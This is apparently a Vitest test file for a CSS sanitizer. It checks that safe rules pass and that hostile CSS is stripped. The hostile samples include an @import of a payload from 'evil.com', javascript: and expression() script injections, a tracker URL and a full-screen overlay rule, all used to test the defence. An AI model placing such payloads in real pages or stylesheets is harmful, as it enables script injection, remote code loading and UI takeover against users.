import { describe, it, expect } from 'vitest';
import { sanitizeCSS } from '@dom/css-injector/css-sanitizer';

describe('CSS Sanitizer & Safety Boundary Tests', () => {
  it('should allow clean, safe CSS rules', () => {
    const safeCss = 'h1 { color: #38bdf8; font-size: 24px; }';
    expect(sanitizeCSS(safeCss)).toBe(safeCss);
  });

  it('should reject @import statements', () => {
    const malicious = '@import url("http://evil.com/payload.css"); h1 { color: red; }';
    expect(sanitizeCSS(malicious)).toBe('');
  });

  it('should reject javascript: URLs', () => {
    const malicious = 'background: url("javascript:alert(1)");';
    expect(sanitizeCSS(malicious)).toBe('');
  });

  it('should reject expression() calls', () => {
    const malicious = 'width: expression(alert(1));';
    expect(sanitizeCSS(malicious)).toBe('');
  });

  it('should reject non-data external URLs', () => {
    const malicious = 'background-image: url("http://tracker.com/img.png");';
    expect(sanitizeCSS(malicious)).toBe('');
  });

  it('should reject viewport takeover attempt (position fixed + high z-index)', () => {
    const malicious = 'div { position: fixed; z-index: 999999; top: 0; left: 0; width: 100vw; height: 100vh; }';
    expect(sanitizeCSS(malicious)).toBe('');
  });

  it('should reject broad all: unset rules on html/body', () => {
    const malicious = 'body { all: unset; }';
    expect(sanitizeCSS(malicious)).toBe('');
  });
});
